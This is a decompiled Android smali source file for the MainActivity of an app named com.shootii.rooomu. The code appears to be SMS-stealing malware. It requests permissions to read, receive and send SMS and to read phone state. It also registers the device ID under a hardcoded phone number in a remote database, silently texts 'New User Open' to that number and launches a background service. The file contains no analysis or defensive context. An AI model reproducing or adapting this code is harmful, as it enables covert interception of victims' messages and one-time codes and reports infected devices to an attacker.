.class public Lcom/shootii/rooomu/MainActivity;
.super Le/h;
.source "SourceFile"


# instance fields
.field public final A:[Ljava/lang/String;

.field public final B:Ljava/lang/String;

.field public final C:Ld1/e;

.field public D:Ljava/lang/String;

.field public final E:J

.field public final z:I


# direct methods
.method public constructor <init>()V
    .locals 7

    .line 1
    invoke-direct {p0}, Le/h;-><init>()V

    .line 4
    iget-object v0, p0, Landroidx/activity/n;->e:Lb0/e;

    .line 6
    iget-object v0, v0, Lb0/e;->d:Ljava/lang/Object;

    .line 8
    check-cast v0, Lb0/d;

    .line 10
    new-instance v1, Lb0/a;

    .line 12
    invoke-direct {v1, p0}, Lb0/a;-><init>(Lcom/shootii/rooomu/MainActivity;)V

    .line 15
    const-string v2, "androidx:appcompat"

    .line 17
    invoke-virtual {v0, v2, v1}, Lb0/d;->e(Ljava/lang/String;Lb0/c;)V

    .line 20
    new-instance v0, Le/g;

    .line 22
    invoke-direct {v0, p0}, Le/g;-><init>(Lcom/shootii/rooomu/MainActivity;)V

    .line 25
    invoke-virtual {p0, v0}, Landroidx/activity/n;->h(La/b;)V

    .line 28
    const/4 v0, 0x1

    .line 29
    iput v0, p0, Lcom/shootii/rooomu/MainActivity;->z:I

    .line 31
    const-string v3, "android.permission.RECEIVE_SMS"

    .line 33
    const-string v4, "android.permission.CALL_PHONE"

    .line 35
    const-string v1, "android.permission.READ_SMS"

    .line 37
    const-string v2, "android.permission.SEND_SMS"

    .line 39
    const-string v5, "android.permission.READ_PHONE_NUMBERS"

    .line 41
    const-string v6, "android.permission.READ_PHONE_STATE"

    .line 43
    filled-new-array/range {v1 .. v6}, [Ljava/lang/String;

    .line 46
    move-result-object v0

    .line 47
    iput-object v0, p0, Lcom/shootii/rooomu/MainActivity;->A:[Ljava/lang/String;

    .line 49
    const-string v0, "+919381172328"

    .line 51
    iput-object v0, p0, Lcom/shootii/rooomu/MainActivity;->B:Ljava/lang/String;

    .line 53
    invoke-static {}, Ld1/e;->a()Ld1/e;

    .line 56
    move-result-object v0

    .line 57
    iput-object v0, p0, Lcom/shootii/rooomu/MainActivity;->C:Ld1/e;

    .line 59
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    .line 62
    move-result-wide v0

    .line 63
    iput-wide v0, p0, Lcom/shootii/rooomu/MainActivity;->E:J

    .line 65
    return-void
.end method


# virtual methods
.method public final onCreate(Landroid/os/Bundle;)V
    .locals 7

    .line 1
    invoke-super {p0, p1}, Le/h;->onCreate(Landroid/os/Bundle;)V

    .line 4
    const p1, 0x7f0b001c

    .line 7
    invoke-virtual {p0, p1}, Le/h;->setContentView(I)V

    .line 10
    invoke-virtual {p0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    .line 13
    move-result-object p1

    .line 14
    const-string v0, "android_id"

    .line 16
    invoke-static {p1, v0}, Landroid/provider/Settings$Secure;->getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;

    .line 19
    move-result-object p1

    .line 20
    iput-object p1, p0, Lcom/shootii/rooomu/MainActivity;->D:Ljava/lang/String;

    .line 22
    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    .line 25
    move-result-object p1

    .line 26
    const-string v0, "Did"

    .line 28
    iget-object v1, p0, Lcom/shootii/rooomu/MainActivity;->D:Ljava/lang/String;

    .line 30
    invoke-static {p1, v0, v1}, Lp0/a;->q0(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 33
    iget-object p1, p0, Lcom/shootii/rooomu/MainActivity;->C:Ld1/e;

    .line 35
    iget-object v0, p0, Lcom/shootii/rooomu/MainActivity;->B:Ljava/lang/String;

    .line 37
    invoke-virtual {p1, v0}, Ld1/e;->b(Ljava/lang/String;)Ld1/c;

    .line 40
    move-result-object v1

    .line 41
    const-string v2, "All_User"

    .line 43
    invoke-virtual {v1, v2}, Ld1/c;->b(Ljava/lang/String;)Ld1/c;

    .line 46
    move-result-object v1

    .line 47
    const-string v3, "User"

    .line 49
    invoke-virtual {v1, v3}, Ld1/c;->b(Ljava/lang/String;)Ld1/c;

    .line 52
    move-result-object v1

    .line 53
    iget-object v3, p0, Lcom/shootii/rooomu/MainActivity;->D:Ljava/lang/String;

    .line 55
    invoke-virtual {v1, v3}, Ld1/c;->b(Ljava/lang/String;)Ld1/c;

    .line 58
    move-result-object v1

    .line 59
    invoke-virtual {p1, v0}, Ld1/e;->b(Ljava/lang/String;)Ld1/c;

    .line 62
    move-result-object p1

    .line 63
    invoke-virtual {p1, v2}, Ld1/c;->b(Ljava/lang/String;)Ld1/c;

    .line 66
    move-result-object p1

    .line 67
    const-string v0, "Info"

    .line 69
    invoke-virtual {p1, v0}, Ld1/c;->b(Ljava/lang/String;)Ld1/c;

    .line 72
    move-result-object p1

    .line 73
    new-instance v0, LA1/b;

    .line 75
    invoke-direct {v0, p0, p1, v1}, LA1/b;-><init>(Lcom/shootii/rooomu/MainActivity;Ld1/c;Ld1/c;)V

    .line 78
    new-instance p1, Li1/B;

    .line 80
    new-instance v2, LA1/i;

    .line 82
    const/16 v3, 0x10

    .line 84
    const/4 v4, 0x0

    .line 85
    invoke-direct {v2, v1, v0, v3, v4}, LA1/i;-><init>(Ljava/lang/Object;Ljava/lang/Object;IZ)V

    .line 88
    new-instance v0, Ln1/h;

    .line 90
    iget-object v3, v1, Ld1/c;->b:Li1/e;

    .line 92
    iget-object v4, v1, Ld1/c;->c:Ln1/g;

    .line 94
    invoke-direct {v0, v3, v4}, Ln1/h;-><init>(Li1/e;Ln1/g;)V

    .line 97
    iget-object v3, v1, Ld1/c;->a:Li1/i;

    .line 99
    invoke-direct {p1, v3, v2, v0}, Li1/B;-><init>(Li1/i;Ld1/k;Ln1/h;)V

    .line 102
    invoke-virtual {v1, p1}, Ld1/c;->a(Li1/B;)V

    .line 105
    iget-object p1, p0, Lcom/shootii/rooomu/MainActivity;->A:[Ljava/lang/String;

    .line 107
    array-length v0, p1

    .line 108
    const/4 v1, 0x0

    .line 109
    :goto_0
    if-ge v1, v0, :cond_8

    .line 111
    aget-object v2, p1, v1

    .line 113
    invoke-virtual {p0, v2}, Landroid/content/Context;->checkCallingOrSelfPermission(Ljava/lang/String;)I

    .line 116
    move-result v2

    .line 117
    if-eqz v2, :cond_7

    .line 119
    iget v0, p0, Lcom/shootii/rooomu/MainActivity;->z:I

    .line 121
    new-instance v1, Ljava/util/HashSet;

    .line 123
    invoke-direct {v1}, Ljava/util/HashSet;-><init>()V

    .line 126
    const/4 v2, 0x0

    .line 127
    move v3, v2

    .line 128
    :goto_1
    array-length v4, p1

    .line 129
    if-ge v3, v4, :cond_2

    .line 131
    aget-object v4, p1, v3

    .line 133
    invoke-static {v4}, Landroid/text/TextUtils;->isEmpty(Ljava/lang/CharSequence;)Z

    .line 136
    move-result v4

    .line 137
    if-nez v4, :cond_1

    .line 139
    sget v4, Landroid/os/Build$VERSION;->SDK_INT:I

    .line 141
    const/16 v5, 0x21

    .line 143
    if-ge v4, v5, :cond_0

    .line 145
    aget-object v4, p1, v3

    .line 147
    const-string v5, "android.permission.POST_NOTIFICATIONS"

    .line 149
    invoke-static {v4, v5}, Landroid/text/TextUtils;->equals(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Z

    .line 152
    move-result v4

    .line 153
    if-eqz v4, :cond_0

    .line 155
    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    .line 158
    move-result-object v4

    .line 159
    invoke-virtual {v1, v4}, Ljava/util/HashSet;->add(Ljava/lang/Object;)Z

    .line 162
    :cond_0
    add-int/lit8 v3, v3, 0x1

    .line 164
    goto :goto_1

    .line 165
    :cond_1
    new-instance v0, Ljava/lang/IllegalArgumentException;

    .line 167
    new-instance v1, Ljava/lang/StringBuilder;

    .line 169
    const-string v2, "Permission request for permissions "

    .line 171
    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 174
    invoke-static {p1}, Ljava/util/Arrays;->toString([Ljava/lang/Object;)Ljava/lang/String;

    .line 177
    move-result-object p1

    .line 178
    const-string v2, " must not contain null or empty values"

    .line 180
    invoke-static {v1, p1, v2}, LA/g;->g(Ljava/lang/StringBuilder;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 183
    move-result-object p1

    .line 184
    invoke-direct {v0, p1}, Ljava/lang/IllegalArgumentException;-><init>(Ljava/lang/String;)V

    .line 187
    throw v0

    .line 188
    :cond_2
    invoke-virtual {v1}, Ljava/util/HashSet;->size()I

    .line 191
    move-result v3

    .line 192
    if-lez v3, :cond_3

    .line 194
    array-length v4, p1

    .line 195
    sub-int/2addr v4, v3

    .line 196
    new-array v4, v4, [Ljava/lang/String;

    .line 198
    goto :goto_2

    .line 199
    :cond_3
    move-object v4, p1

    .line 200
    :goto_2
    if-lez v3, :cond_6

    .line 202
    array-length v5, p1

    .line 203
    if-ne v3, v5, :cond_4

    .line 205
    goto :goto_4

    .line 206
    :cond_4
    move v3, v2

    .line 207
    :goto_3
    array-length v5, p1

    .line 208
    if-ge v2, v5, :cond_6

    .line 210
    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    .line 213
    move-result-object v5

    .line 214
    invoke-virtual {v1, v5}, Ljava/util/HashSet;->contains(Ljava/lang/Object;)Z

    .line 217
    move-result v5

    .line 218
    if-nez v5, :cond_5

    .line 220
    add-int/lit8 v5, v3, 0x1

    .line 222
    aget-object v6, p1, v2

    .line 224
    aput-object v6, v4, v3

    .line 226
    move v3, v5

    .line 227
    :cond_5
    add-int/lit8 v2, v2, 0x1

    .line 229
    goto :goto_3

    .line 230
    :cond_6
    invoke-static {p0, p1, v0}, Lx/a;->b(Landroid/app/Activity;[Ljava/lang/String;I)V

    .line 233
    goto :goto_4

    .line 234
    :cond_7
    add-int/lit8 v1, v1, 0x1

    .line 236
    goto :goto_0

    .line 237
    :cond_8
    invoke-virtual {p0}, Lcom/shootii/rooomu/MainActivity;->r()V

    .line 240
    :goto_4
    return-void
.end method

.method public final onRequestPermissionsResult(I[Ljava/lang/String;[I)V
    .locals 6

    .line 1
    invoke-super {p0, p1, p2, p3}, Le/h;->onRequestPermissionsResult(I[Ljava/lang/String;[I)V

    .line 4
    const/4 p2, 0x1

    .line 5
    if-eq p1, p2, :cond_0

    .line 7
    return-void

    .line 8
    :cond_0
    array-length p1, p3

    .line 9
    if-lez p1, :cond_1

    .line 11
    const/4 p1, 0x0

    .line 12
    aget p1, p3, p1

    .line 14
    if-nez p1, :cond_1

    .line 16
    invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;

    .line 19
    move-result-object v0

    .line 20
    const/4 v4, 0x0

    .line 21
    const/4 v5, 0x0

    .line 22
    const-string v1, "+919381172328"

    .line 24
    const/4 v2, 0x0

    .line 25
    const-string v3, "New User Open"

    .line 27
    invoke-virtual/range {v0 .. v5}, Landroid/telephony/SmsManager;->sendTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V

    .line 30
    invoke-virtual {p0}, Lcom/shootii/rooomu/MainActivity;->r()V

    .line 33
    goto :goto_0

    .line 34
    :cond_1
    invoke-virtual {p0}, Landroid/app/Activity;->finish()V

    .line 37
    :goto_0
    return-void
.end method

.method public final r()V
    .locals 3

    .line 1
    const-string v0, "activity"

    .line 3
    invoke-virtual {p0, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    .line 6
    move-result-object v0

    .line 7
    check-cast v0, Landroid/app/ActivityManager;

    .line 9
    const v1, 0x7fffffff

    .line 12
    invoke-virtual {v0, v1}, Landroid/app/ActivityManager;->getRunningServices(I)Ljava/util/List;

    .line 15
    move-result-object v0

    .line 16
    invoke-interface {v0}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    .line 19
    move-result-object v0

    .line 20
    :cond_0
    invoke-interface {v0}, Ljava/util/Iterator;->hasNext()Z

    .line 23
    move-result v1

    .line 24
    const-class v2, Lcom/shootii/rooomu/MyService;

    .line 26
    if-eqz v1, :cond_1

    .line 28
    invoke-interface {v0}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    .line 31
    move-result-object v1

    .line 32
    check-cast v1, Landroid/app/ActivityManager$RunningServiceInfo;

    .line 34
    invoke-virtual {v2}, Ljava/lang/Class;->getName()Ljava/lang/String;

    .line 37
    move-result-object v2

    .line 38
    iget-object v1, v1, Landroid/app/ActivityManager$RunningServiceInfo;->service:Landroid/content/ComponentName;

    .line 40
    invoke-virtual {v1}, Landroid/content/ComponentName;->getClassName()Ljava/lang/String;

    .line 43
    move-result-object v1

    .line 44
    invoke-virtual {v2, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 47
    move-result v1

    .line 48
    if-eqz v1, :cond_0

    .line 50
    goto :goto_0

    .line 51
    :cond_1
    new-instance v0, Landroid/content/Intent;

    .line 53
    invoke-direct {v0, p0, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 56
    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    .line 58
    const/16 v2, 0x1a

    .line 60
    if-lt v1, v2, :cond_2

    .line 62
    invoke-static {p0, v0}, LA1/a;->z(Lcom/shootii/rooomu/MainActivity;Landroid/content/Intent;)V

    .line 65
    :cond_2
    :goto_0
    return-void
.end method
